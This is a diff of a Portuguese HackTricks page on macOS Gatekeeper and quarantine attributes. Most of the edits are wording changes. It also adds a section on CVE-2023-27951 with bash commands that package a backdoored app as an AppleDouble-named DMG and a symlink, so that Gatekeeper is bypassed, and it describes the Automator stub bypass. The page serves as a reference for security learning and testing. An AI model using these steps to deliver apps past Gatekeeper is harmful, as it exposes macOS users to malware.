@@ -38,7 +38,7 @@ A partir do macOS Catalina, o Gatekeeper também verifica se o aplicativo foi **
 
 #### Verificar Assinaturas
 
-Ao verificar algum **exemplo de malware**, você sempre deve **verificar a assinatura** do binário, pois o **desenvolvedor** que o assinou pode estar **relacionado** com **malware**.
+Ao verificar alguma **amostra de malware**, você sempre deve **verificar a assinatura** do binário, pois o **desenvolvedor** que o assinou pode estar **relacionado** com **malware**.
 ```bash
 # Get signer
 codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"
@@ -143,11 +143,11 @@ spctl --assess -v /Applications/App.app
 ```
 ### Arquivos em Quarentena
 
-Ao **baixar** um aplicativo ou arquivo, aplicativos específicos do macOS, como navegadores da web ou clientes de e-mail, **anexam um atributo de arquivo estendido**, comumente conhecido como "**flag de quarentena**", ao arquivo baixado. Esse atributo atua como uma medida de segurança para **marcar o arquivo** como proveniente de uma fonte não confiável (a internet) e potencialmente portador de riscos. No entanto, nem todos os aplicativos anexam esse atributo, por exemplo, software comum de cliente BitTorrent geralmente ignora esse processo.
+Ao **baixar** um aplicativo ou arquivo, aplicativos específicos do macOS, como navegadores da web ou clientes de e-mail, **anexam um atributo de arquivo estendido**, comumente conhecido como "**sinalizador de quarentena**", ao arquivo baixado. Esse atributo atua como uma medida de segurança para **marcar o arquivo** como proveniente de uma fonte não confiável (a internet) e potencialmente portador de riscos. No entanto, nem todos os aplicativos anexam esse atributo, por exemplo, software comum de cliente BitTorrent geralmente ignora esse processo.
 
-**A presença de uma flag de quarentena sinaliza o recurso de segurança Gatekeeper do macOS quando um usuário tenta executar o arquivo**.
+**A presença de um sinalizador de quarentena sinaliza o recurso de segurança Gatekeeper do macOS quando um usuário tenta executar o arquivo**.
 
-No caso em que a **flag de quarentena não está presente** (como em arquivos baixados por alguns clientes BitTorrent), as **verificações do Gatekeeper podem não ser realizadas**. Portanto, os usuários devem ter cuidado ao abrir arquivos baixados de fontes menos seguras ou desconhecidas.
+No caso em que o **sinalizador de quarentena não está presente** (como nos arquivos baixados por alguns clientes BitTorrent), as **verificações do Gatekeeper podem não ser realizadas**. Portanto, os usuários devem ter cuidado ao abrir arquivos baixados de fontes menos seguras ou desconhecidas.
 
 {% hint style="info" %}
 **Verificar** a **validade** das assinaturas de código é um processo **intensivo em recursos** que inclui a geração de **hashes** criptográficos do código e de todos os recursos agrupados. Além disso, verificar a validade do certificado envolve fazer uma **verificação online** nos servidores da Apple para ver se ele foi revogado após ter sido emitido. Por esses motivos, uma verificação completa de assinatura de código e notarização é **impraticável de ser executada toda vez que um aplicativo é iniciado**.
@@ -245,7 +245,7 @@ Verifique o [**relatório original**](https://labs.withsecure.com/publications/t
 
 ### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)
 
-Quando um aplicativo é criado com o **Automator**, as informações sobre o que ele precisa executar estão dentro de `application.app/Contents/document.wflow`, não no executável. O executável é apenas um binário genérico do Automator chamado **Automator Application Stub**.
+Quando um aplicativo é criado com o **Automator**, as informações sobre o que ele precisa executar estão dentro de `application.app/Contents/document.wflow` e não no executável. O executável é apenas um binário genérico do Automator chamado **Automator Application Stub**.
 
 Portanto, você poderia fazer com que `application.app/Contents/MacOS/Automator\ Application\ Stub` **apontasse com um link simbólico para outro Automator Application Stub dentro do sistema** e ele executaria o que está dentro de `document.wflow` (seu script) **sem acionar o Gatekeeper** porque o executável real não possui o atributo de quarentena.
 
@@ -291,13 +291,46 @@ Verifique o [**relatório original**](https://www.microsoft.com/en-us/security/b
 
 ### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
 
-Foi descoberto que o **Google Chrome não estava definindo o atributo de quarentena** para arquivos baixados devido a problemas internos do macOS.
+Foi descoberto que o **Google Chrome não estava definindo o atributo de quarentena** para arquivos baixados devido a alguns problemas internos do macOS.
 
+### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
+
+Os formatos de arquivo AppleDouble armazenam os atributos de um arquivo em um arquivo separado começando com `._`, isso ajuda a copiar os atributos do arquivo **entre máquinas macOS**. No entanto, foi observado que, após descompactar um arquivo AppleDouble, o arquivo que começa com `._` **não recebia o atributo de quarentena**.
+
+{% code overflow="wrap" %}
+```bash
+mkdir test
+echo a > test/a
+echo b > test/b
+echo ._a > test/._a
+aa archive -d test/ -o test.aar
+
+# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
+```
+{% endcode %}
+
+Ser capaz de criar um arquivo que não terá o atributo de quarentena definido, era **possível contornar o Gatekeeper**. O truque era **criar um aplicativo de arquivo DMG** usando a convenção de nome AppleDouble (começando com `._`) e criar um **arquivo visível como um link simbólico para este arquivo oculto** sem o atributo de quarentena.\
+Quando o **arquivo dmg é executado**, como ele não possui um atributo de quarentena, ele **contorna o Gatekeeper**.
+```bash
+# Create an app bundle with the backdoor an call it app.app
+
+echo "[+] creating disk image with app"
+hdiutil create -srcfolder app.app app.dmg
+
+echo "[+] creating directory and files"
+mkdir
+mkdir -p s/app
+cp app.dmg s/app/._app.dmg
+ln -s ._app.dmg s/app/app.dmg
+
+echo "[+] compressing files"
+aa archive -d s/ -o app.aar
+```
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
